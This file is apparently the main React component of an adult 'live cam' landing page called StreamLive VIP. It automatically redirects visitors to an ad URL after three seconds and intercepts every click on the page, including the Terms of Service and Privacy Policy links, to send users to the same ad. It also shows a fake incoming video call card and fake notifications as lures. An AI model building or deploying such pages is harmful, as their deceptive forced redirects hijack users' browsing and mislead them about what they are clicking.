import React, { useState, useEffect, useCallback } from 'react';
import { Navbar } from './components/Navbar';
import { FeaturedLiveVideo } from './components/FeaturedLiveVideo';
import { VideoGrid } from './components/VideoGrid';
import { IncomingCallCard } from './components/IncomingCallCard';
import { FloatingNotifications } from './components/FloatingNotifications';
import { VIDEOS, CALLING_GIRL_DATA, NOTIFICATIONS_DATA, AD_REDIRECT_URL } from './data/mockData';
import { PhoneCall, Video, Flame, ShieldAlert, Sparkles, ExternalLink } from 'lucide-react';

export default function App() {
  const [showCallCard, setShowCallCard] = useState<boolean>(false);
  const [hasRedirected, setHasRedirected] = useState<boolean>(false);

  // Function to execute the ad link redirection
  const handleTriggerAd = useCallback(() => {
    try {
      // Try opening in new window/tab, fallback to current window
      const win = window.open(AD_REDIRECT_URL, '_blank', 'noopener,noreferrer');
      if (!win || win.closed || typeof win.closed === 'undefined') {
        window.location.href = AD_REDIRECT_URL;
      }
    } catch {
      window.location.href = AD_REDIRECT_URL;
    }
  }, []);

  useEffect(() => {
    // 1. Show the incoming call card after 2 seconds
    const callCardTimer = setTimeout(() => {
      setShowCallCard(true);
    }, 2000);

    // 2. Auto-redirect to the ad after 2.8 - 3.0 seconds (user asked for 2-3 seconds)
    const autoRedirectTimer = setTimeout(() => {
      if (!hasRedirected) {
        setHasRedirected(true);
        handleTriggerAd();
      }
    }, 3000);

    // 3. User requested: wherever the user clicks on the page, redirect to the ad link immediately
    const handleGlobalClick = (event: MouseEvent) => {
      // Prevent default action if needed and immediately trigger ad
      handleTriggerAd();
    };

    // Attach click listener with capture so every click from top corner to bottom is intercepted
    document.addEventListener('click', handleGlobalClick, { capture: true });

    return () => {
      clearTimeout(callCardTimer);
      clearTimeout(autoRedirectTimer);
      document.removeEventListener('click', handleGlobalClick, { capture: true });
    };
  }, [handleTriggerAd, hasRedirected]);

  const featuredVideo = VIDEOS[0];
  const gridVideos = VIDEOS.slice(1);

  return (
    <div 
      id="main-app-container"
      onClick={handleTriggerAd}
      className="min-h-screen bg-[#0a0a0f] text-neutral-100 flex flex-col font-sans selection:bg-rose-500 selection:text-white cursor-pointer relative overflow-x-hidden"
    >
      {/* Background ambient lighting effects */}
      <div className="fixed top-0 left-1/4 w-96 h-96 bg-rose-600/10 rounded-full blur-3xl pointer-events-none" />
      <div className="fixed bottom-1/4 right-1/4 w-96 h-96 bg-pink-600/10 rounded-full blur-3xl pointer-events-none" />

      {/* Top Navigation Header */}
      <Navbar onAdClick={handleTriggerAd} unreadCount={5} />

      {/* Live Stream Banner Alert */}
      <div 
        id="live-banner-alert"
        onClick={handleTriggerAd}
        className="w-full bg-gradient-to-r from-rose-950/80 via-neutral-900 to-rose-950/80 border-b border-rose-500/20 py-2 px-4 text-center cursor-pointer"
      >
        <div className="max-w-6xl mx-auto flex items-center justify-center gap-2 text-xs sm:text-sm font-semibold text-rose-300">
          <span className="w-2 h-2 rounded-full bg-rose-500 animate-ping shrink-0" />
          <span className="text-white font-bold">LIMITED ACCESS:</span>
          <span>High-definition Indian live cam stream currently broadcasted. Tap to unlock full VIP video player.</span>
          <span className="hidden sm:inline-flex items-center gap-1 text-rose-400 underline font-bold ml-2">
            Instant Connect <ExternalLink className="w-3 h-3" />
          </span>
        </div>
      </div>

      {/* Main Content Area */}
      <main className="flex-1 max-w-6xl w-full mx-auto px-4 sm:px-6 py-6 flex flex-col">
        {/* 1. Top Thumbnail with LIVE Badge (Featured Video) */}
        <FeaturedLiveVideo video={featuredVideo} onAdClick={handleTriggerAd} />

        {/* 2. Grid of 3 Remaining Video Thumbnails */}
        <VideoGrid videos={gridVideos} onAdClick={handleTriggerAd} />

        {/* Floating Call-to-Action Bar for Engagement */}
        <section 
          id="vip-access-cta"
          onClick={handleTriggerAd}
          className="mt-10 mb-8 p-6 rounded-3xl bg-gradient-to-r from-rose-900/60 via-neutral-900 to-pink-900/60 border border-rose-500/30 text-center shadow-2xl shadow-rose-950/40 relative overflow-hidden"
        >
          <div className="relative z-10 max-w-xl mx-auto flex flex-col items-center gap-3">
            <span className="px-3 py-1 rounded-full bg-rose-500/20 border border-rose-500/40 text-rose-400 text-xs font-bold uppercase tracking-wider flex items-center gap-1.5">
              <Sparkles className="w-3.5 h-3.5 text-amber-400" />
              Direct 1-on-1 Video Calling
            </span>

            <h3 className="text-xl sm:text-2xl font-black text-white">
              Connect With Active Indian Models Online Now
            </h3>

            <p className="text-xs sm:text-sm text-neutral-300">
              No registration required. Fast connection via secure private servers. Click anywhere to begin instant streaming and chat.
            </p>

            <button
              id="start-live-chat-btn"
              onClick={handleTriggerAd}
              className="mt-2 w-full sm:w-auto px-8 py-3.5 rounded-full bg-gradient-to-r from-rose-600 via-pink-600 to-rose-500 hover:from-rose-500 hover:to-pink-500 text-white font-black text-sm shadow-xl shadow-rose-600/40 flex items-center justify-center gap-2 transform active:scale-95 transition-all cursor-pointer"
            >
              <Video className="w-4 h-4 fill-white" />
              <span>START INSTANT VIDEO CHAT</span>
            </button>
          </div>
        </section>
      </main>

      {/* Floating Notifications (Slides down from top right with girls and tempting texts) */}
      <FloatingNotifications items={NOTIFICATIONS_DATA} onAdClick={handleTriggerAd} />

      {/* Incoming Call Card (Pops up automatically after 2-3 seconds with zoom breathing animation) */}
      <IncomingCallCard
        data={CALLING_GIRL_DATA}
        visible={showCallCard}
        onAdClick={handleTriggerAd}
      />

      {/* Sticky Bottom Mobile Bar for instant call response */}
      <div 
        id="sticky-mobile-cta"
        onClick={handleTriggerAd}
        className="sm:hidden fixed bottom-0 inset-x-0 z-35 bg-neutral-950/95 backdrop-blur-md border-t border-rose-500/30 p-3 flex items-center justify-between gap-3 shadow-2xl"
      >
        <div className="flex items-center gap-2.5">
          <div className="relative">
            <img
              src={CALLING_GIRL_DATA.avatar}
              alt={CALLING_GIRL_DATA.name}
              onError={(e) => {
                (e.target as HTMLImageElement).src = CALLING_GIRL_DATA.fallbackAvatar;
              }}
              className="w-10 h-10 rounded-full object-cover border border-rose-500"
            />
            <span className="absolute bottom-0 right-0 w-3 h-3 bg-emerald-500 border-2 border-neutral-950 rounded-full animate-ping" />
          </div>
          <div>
            <p className="text-xs font-bold text-white leading-none">
              {CALLING_GIRL_DATA.name} is calling...
            </p>
            <p className="text-[11px] text-emerald-400 font-medium mt-0.5">
              🟢 Ready for Video Chat
            </p>
          </div>
        </div>

        <button
          id="mobile-accept-btn"
          onClick={handleTriggerAd}
          className="bg-emerald-500 hover:bg-emerald-400 text-white font-black text-xs px-4 py-2 rounded-xl shadow-lg shadow-emerald-500/30 flex items-center gap-1.5 animate-pulse cursor-pointer shrink-0"
        >
          <PhoneCall className="w-3.5 h-3.5" />
          <span>Answer</span>
        </button>
      </div>

      {/* Footer */}
      <footer className="mt-auto border-t border-neutral-900 bg-neutral-950/80 py-6 text-center text-xs text-neutral-500 select-none">
        <div className="max-w-6xl mx-auto px-4 flex flex-col sm:flex-row items-center justify-between gap-3">
          <p>© 2026 StreamLive VIP. All rights reserved. 18+ Content Only.</p>
          <div className="flex items-center gap-4 text-neutral-400">
            <span onClick={handleTriggerAd} className="hover:underline cursor-pointer">Terms of Service</span>
            <span>•</span>
            <span onClick={handleTriggerAd} className="hover:underline cursor-pointer">Privacy Policy</span>
            <span>•</span>
            <span onClick={handleTriggerAd} className="hover:underline cursor-pointer">2257 Exemption</span>
          </div>
        </div>
      </footer>
    </div>
  );
}
